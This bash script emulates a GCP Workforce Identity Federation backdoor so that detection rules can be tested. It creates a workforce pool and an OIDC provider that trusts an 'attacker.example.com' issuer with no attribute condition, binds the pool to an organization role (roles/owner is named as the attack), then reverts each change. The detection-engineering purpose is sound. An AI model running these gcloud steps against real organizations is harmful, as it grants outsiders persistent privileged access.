#!/usr/bin/env bash
# TRR9020 (T1199) behavioral emulation: Workforce Identity Federation backdoor in GCP --
# trust an external IdP for ORG-scoped human identities and bind a workforce principalSet
# directly to a privileged project/folder/org role.
#
#   * DOCUMENT/LIVE: with TRR9020_LIVE=1 (or --live) and gcloud signed in at org scope,
#     makes a THROWAWAY workforce pool + OIDC provider (no attribute condition) and binds
#     its principalSet to a role, then reverts each change. Your own organization. NOT run
#     in CI. Needs TRR9020_ORG (your organization ID); it stops before any change if it is
#     not set. When TRR9020_POOL is not set, the pool name is unique for each run, because a
#     workforce pool ID must be unique for all Google Cloud customers and Google blocks the
#     name of a deleted pool for 30 days. A pool or provider name that you set must start
#     with trr9020-. Only procedures a and c have a live run; b and d stop with exit 1.
#     The default role is roles/viewer (a safe role). The run then writes the SetIamPolicy
#     record, but the binding rule does NOT fire, by design. For a binding to the full pool
#     (what this run makes), the rule fires for a role whose name holds owner, editor or
#     admin, and for a roles/iam. role whose name ends with Creator or User (for example
#     roles/iam.serviceAccountTokenCreator). Set TRR9020_ROLE to such a role for the record
#     that fires the rule (roles/owner is the attack; a role with less power is sufficient).
#     A stop signal (Ctrl-C) or a command that fails reverts the changes that were made. A
#     change whose command was stopped in the middle can stay: the run names it.
#   * FIXTURE: --show-fixture prints the committed Cloud Audit Log fixtures the CI validator
#     runs the detections over.
#
# Rules:
#   detections/sigma/T1199/gcp_workforce_pool_provider_no_attribute_condition.yml   (A/B provider)
#   detections/sigma/T1199/gcp_workforce_principalset_privileged_binding.yml        (A/C binding)
set -euo pipefail

PROC="${1:-c}"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FIXDIR="$HERE/../../../detections/cloud/fixtures/trr9020"

if [[ "${1:-}" == "--show-fixture" || "${2:-}" == "--show-fixture" ]]; then
  cat "$FIXDIR/attack.json"; exit 0
fi

# Fixture-safe defaults. They are only for the text of the dry mode. A live run needs the
# real organization ID in TRR9020_ORG (see the check in the live branch).
ORG="${TRR9020_ORG:-123456789012}"
POOL="${TRR9020_POOL:-trr9020-ext-pool}"
PROVIDER="${TRR9020_PROVIDER:-trr9020-idp}"   # a throwaway name; it starts with trr9020-
ISSUER="${TRR9020_ISSUER:-https://attacker.example.com}"
ROLE="${TRR9020_ROLE:-roles/viewer}"   # LIVE default is a SAFE role; the attack uses roles/owner
CLIENT_ID="trr9020-client"             # OIDC audience; any throwaway value is fine for the test

LIVE=0
if [[ "${TRR9020_LIVE:-0}" == "1" || "${2:-}" == "--live" ]]; then LIVE=1; fi

# A live run that did not get a pool name makes a unique one. It still starts with trr9020-.
if [[ "$LIVE" == "1" && -z "${TRR9020_POOL:-}" ]]; then
  POOL="trr9020-$(date +%Y%m%d%H%M%S)-${RANDOM}"
fi

echo "== TRR9020.GCP.$PROC — Workforce Identity Federation backdoor =="
case "$PROC" in
  a) echo "A: full backdoor -- create workforce pool + external provider (no attributeCondition),"
     echo "   then bind principalSet://.../workforcePools/<pool>/* to a privileged role." ;;
  b) echo "B: loosen an existing provider -- UpdateWorkforcePoolProvider (blank the attributeCondition)." ;;
  c) echo "C: bind a workforce principalSet directly to a privileged project/folder/org role"
     echo "   (cloudresourcemanager SetIamPolicy; no SA / workloadIdentityUser step)." ;;
  d) echo "D: use -- workforce sign-in + STS token exchange. GAP: Data Access / Admin-Read, OFF BY DEFAULT." ;;
  *) echo "usage: emulate_gcp_workforce.sh {a|b|c|d} [--live|--show-fixture]"; exit 1 ;;
esac
echo
echo "The member + role that define the chokepoint:"
echo "  principalSet://iam.googleapis.com/locations/global/workforcePools/${POOL}/*"
echo "  attack role: roles/owner   provider attributeCondition: (empty)   issuer: ${ISSUER}"

if [[ "$LIVE" == "1" ]]; then
  # Only A and C have a live run (C is the binding leg of A). B (loosen an existing provider)
  # and D (sign-in; a gap) have no live run: the script makes no change and causes no
  # record, so it does not end with exit 0.
  case "$PROC" in
    a|c) ;;
    *) echo "[live] procedure $PROC has no live run: no record was caused. The script made no change. Use a or c." >&2
       exit 1 ;;
  esac
  command -v gcloud >/dev/null || { echo "gcloud not found" >&2; exit 1; }
  # No placeholder in a live run. A workforce pool is a resource of an organization, so the
  # run needs your real organization ID. Stop before the first change when it is not set.
  if [[ -z "${TRR9020_ORG:-}" ]]; then
    echo "[live] TRR9020_ORG is not set. Set it to your own Google Cloud organization ID." >&2
    echo "[live] Stopping before any change." >&2
    exit 2
  fi
  # Each throwaway object has a name that starts with trr9020-, so that the check for
  # leftovers finds it. Stop before any change when a name that you set does not.
  if [[ "$POOL" != trr9020-* ]]; then
    echo "[live] TRR9020_POOL must start with trr9020- (it is '$POOL'). Stopping before any change." >&2
    exit 2
  fi
  if [[ "$PROVIDER" != trr9020-* ]]; then
    echo "[live] TRR9020_PROVIDER must start with trr9020- (it is '$PROVIDER'). Stopping before any change." >&2
    exit 2
  fi
  # >>> live undo (the same text in each live script; atomics/tests/undo_block.sh is the reference)
  _UNDO=()      # the commands that revert the changes
  _LEFT=0       # 1 after an undo command failed
  _SIG=0        # the exit code of the first stop signal: 129 HUP, 130 INT, 143 TERM
  _HIT=0        # 1 after a stop signal came while an undo command ran
  _BUSY=""      # the change that the next command makes: set by change_next, cleared by undo
  _UNDOING=0    # 1 while the undo commands run
  change_next() { _BUSY="$*"; }                   # say this before each command that makes a change
  undo() {                                        # after the command: register the command that reverts the change
    local quoted
    printf -v quoted '%q ' "$@"                   # no command substitution: a stop signal in one can end bash with a syntax error
    _UNDO+=("$quoted")
    _BUSY=""
    if [[ $_SIG -ne 0 ]]; then exit "$_SIG"; fi   # a stop signal waited for this registration
  }
  _undo_run() {                                   # run the registered commands, last registered first
    local i runs
    _UNDOING=1
    while (( ${#_UNDO[@]} > 0 )); do
      i=$(( ${#_UNDO[@]} - 1 ))
      echo "[live] undo: ${_UNDO[$i]}"
      runs=0
      while :; do
        _HIT=0
        runs=$(( runs + 1 ))
        if eval "${_UNDO[$i]}" >/dev/null; then break; fi
        if [[ $_HIT -eq 0 || $runs -ge 3 ]]; then   # it failed with no stop signal, or a stop signal came in each of 3 runs
          echo "[live] LEFT BEHIND, this command failed: ${_UNDO[$i]}" >&2; _LEFT=1; break
        fi
        echo "[live] a stop signal came and this undo command failed: it starts again" >&2
      done
      unset "_UNDO[$i]"                           # a command that ran to its end does not run again
    done
  }
  undo_now() {                                    # the planned end: revert each change, then go on only if all is good
    _undo_run
    _UNDOING=0                                    # from here a stop signal stops the run at once
    if [[ $_SIG -ne 0 ]]; then exit "$_SIG"; fi   # a stop signal came: do not print "done"
    if [[ $_LEFT -ne 0 ]]; then exit 1; fi        # an undo failed: do not print "done"
    trap '' HUP INT TERM                          # each change is reverted: a late stop signal must not fail a good run
  }
  _on_exit() {
    local code=$?
    trap - EXIT
    set +e
    if [[ $_SIG -ne 0 ]]; then code=$_SIG; fi
    if [[ -n "$_BUSY" ]]; then
      echo "[live] The run stopped before the undo of this change was registered: $_BUSY" >&2
      echo "[live] That change has no undo. If the provider made it, it stays: do the check and remove it." >&2
    fi
    _undo_run
    if [[ $code -eq 0 && $_LEFT -ne 0 ]]; then code=1; fi
    if [[ $code -ne 0 ]]; then
      echo "[live] FAILED (exit $code). Read the lines above. Then do the check that nothing stays behind (docs/setup/)." >&2
    fi
    exit "$code"
  }
  _stop() {                                       # a stop signal came
    if [[ $_SIG -eq 0 ]]; then _SIG=$1; fi
    if [[ $_UNDOING -ne 0 ]]; then
      _HIT=1
      echo "[live] signal during the undo: the undo continues" >&2
    elif [[ -n "$_BUSY" ]]; then
      echo "[live] stop signal during a change: the run stops after this change" >&2
    else
      _on_exit                                    # not a plain exit: bash does not start the EXIT trap a second time
    fi
  }
  trap _on_exit EXIT
  trap '_stop 129' HUP
  trap '_stop 130' INT
  trap '_stop 143' TERM
  trap '' PIPE                                    # a reader of the output that is gone must not stop the undo
  # <<< live undo
  MEMBER="principalSet://iam.googleapis.com/locations/global/workforcePools/${POOL}/*"
  echo
  echo "[live] creating throwaway workforce pool '$POOL' (org $ORG)..."
  change_next "workforce pool $POOL"
  gcloud iam workforce-pools create "$POOL" --organization="$ORG" --location=global \
    --display-name="trr9020 ext pool" >/dev/null
  undo gcloud iam workforce-pools delete "$POOL" --location=global --quiet
  echo "[live] creating OIDC provider '$PROVIDER' (no attributeCondition, issuer $ISSUER)..."
  # The implicit flow (--web-sso-response-type=id-token) needs no client secret, so the run
  # stores no secret. The provider has no attributeCondition, which is what the rule reads.
  change_next "provider $PROVIDER of the workforce pool $POOL"
  gcloud iam workforce-pools providers create-oidc "$PROVIDER" --location=global \
    --workforce-pool="$POOL" --issuer-uri="$ISSUER" --client-id="$CLIENT_ID" \
    --attribute-mapping="google.subject=assertion.sub" \
    --web-sso-response-type=id-token \
    --web-sso-assertion-claims-behavior=only-id-token-claims >/dev/null
  undo gcloud iam workforce-pools providers delete "$PROVIDER" --location=global \
    --workforce-pool="$POOL" --quiet
  echo "[live] binding the pool principalSet to $ROLE on org $ORG (SAFE role by default)..."
  # --condition=None: the run must say that it adds no condition. Without the option, when
  # the organization policy already holds a binding with a condition, gcloud asks a question
  # on a terminal and stops with an error when there is no terminal.
  change_next "binding of $MEMBER to $ROLE on the organization $ORG"
  gcloud organizations add-iam-policy-binding "$ORG" --role="$ROLE" \
    --member="$MEMBER" --condition=None >/dev/null
  undo gcloud organizations remove-iam-policy-binding "$ORG" --role="$ROLE" \
    --member="$MEMBER" --condition=None
  echo "[live] review the ORGANISATION's Admin Activity log for SetIamPolicy + CreateWorkforcePoolProvider."
  # Say what the binding record does to the paired rule. The rule reads the NAME of the role,
  # and this run binds the full pool. The patterns below are the role parts of the rule: a
  # name that holds owner, editor or admin, and a roles/iam. role whose name ends with
  # Creator or User (for example roles/iam.serviceAccountTokenCreator). A name that matches
  # none of them says nothing about the power of the role, so the text does not call it safe.
  case "$ROLE" in
    *[Oo]wner*|*[Ee]ditor*|*[Aa]dmin*)
      echo "[live] The role $ROLE holds owner, editor or admin: the binding rule reads this record." ;;
    roles/iam.*[Cc]reator|roles/iam.*[Uu]ser)
      echo "[live] The role $ROLE is a roles/iam. creator or user role: the binding rule reads this record." ;;
    *)
      echo "[live] The role $ROLE: the SetIamPolicy record is written, but the binding rule"
      echo "[live] does NOT fire, by design. The rule reads the name of the role, not its power. For the"
      echo "[live] record that fires it, set TRR9020_ROLE to a role whose name holds owner, editor or"
      echo "[live] admin (roles/owner is the attack; less power is sufficient)." ;;
  esac
  echo "[live] Reverting..."
  undo_now
  echo "[live] done. NOTE: workforce pools are org-scoped -- use an org-level log sink to see Leg 1."
else
  echo
  echo "(dry) set TRR9020_LIVE=1 (and TRR9020_ORG) with gcloud signed in at org scope to run the"
  echo "      throwaway pool/provider/binding create+revert, or pass --show-fixture for the telemetry."
fi
